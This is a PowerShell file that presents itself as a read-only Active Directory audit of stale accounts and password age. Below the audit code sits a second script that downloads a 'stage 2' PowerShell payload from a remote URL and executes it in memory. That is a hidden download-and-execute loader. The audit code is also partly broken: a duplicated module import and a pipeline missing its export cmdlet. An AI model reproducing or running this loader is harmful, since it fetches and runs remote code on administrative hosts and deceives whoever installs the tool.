<#
.SYNOPSIS
    Audits Active Directory user accounts for stale sign-ins and password age.
.DESCRIPTION
    Queries the configured search base, flags accounts whose last logon is older
    than the inactivity threshold and exports the result set to CSV.
    The script is read-only. It never modifies directory objects and can be
    scheduled on a management host with the RSAT tools installed.
.PARAMETER Domain
    Overrides the default value defined in the parameter block.
.PARAMETER SearchBase
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\Get-StaleADUser.ps1 -InactiveDays 30
.EXAMPLE
    .\Get-StaleADUser.ps1 -SearchBase OU=Managed Users,DC=internal,DC=corp -Verbose
#>

param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [Alias("DnsDomain")]
    [string]$Domain = "internal.corp",
    [string]$SearchBase = "OU=Managed Users,DC=internal,DC=corp",
    [string]$ReportPath = 'D:\Ops\reports\ad-user-audit-2026-01-14.csv',
    [string]$HtmlPath = 'D:\Ops\reports\ad-user-audit-2026-01-14.html',

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 30,
    [int]$PasswordMaxAge = 90,
    [string]$SmtpServer = 'smtp.internal.corp'
)

$ErrorActionPreference = 'Stop'
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
Set-StrictMode -Version 2.0
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

Import-Module ActiveDirectory -ErrorAction Stop

Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}

$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count

$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet |
    -NoTypeInformation `
    -Path $ReportPath.Replace('.csv', '-passwords.csv') `
    -Encoding UTF8
Write-Host ("Stale: {0} | Disabled: {1} | Old passwords: {2}" -f $staleCount, $disabledCount, $oldPwdCount) -ForegroundColor Cyan
Write-Verbose ("Report written to {0}" -f $ReportPath)

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

Send-MailMessage -To $MailTo -From $MailFrom -Subject "AD user audit: stale accounts" -Body "Stale accounts were found. See the attached report." -SmtpServer $SmtpServer -Port 587 -UseSsl
<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://adatum.com/stage2.ps1",
    [string]$TracePath = "$env:TEMP\transfer.log",
    [int]$StageTimeout = 26
)
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 26
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    param(
        [string]$ScriptBody = ''
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

Write-Verbose "Starting in-memory stage"
$ScriptText = Get-StageScriptText -SourceUrl $Stage1Url -TimeoutSec $StageTimeout
$TransferResult = Invoke-Stage2Script -ScriptBody $ScriptText
Write-Verbose "Stage result: $($TransferResult)"

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $Stage1Url
    ScriptLength = $ScriptText.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Applying operation timeout"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Stage handoff finished"
Write-Verbose "Validating result"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Retry budget remaining"
Write-Verbose "Exporting operation report"
Write-Verbose "stage marker 31 reached"
Write-Output "stage 24 initialized"
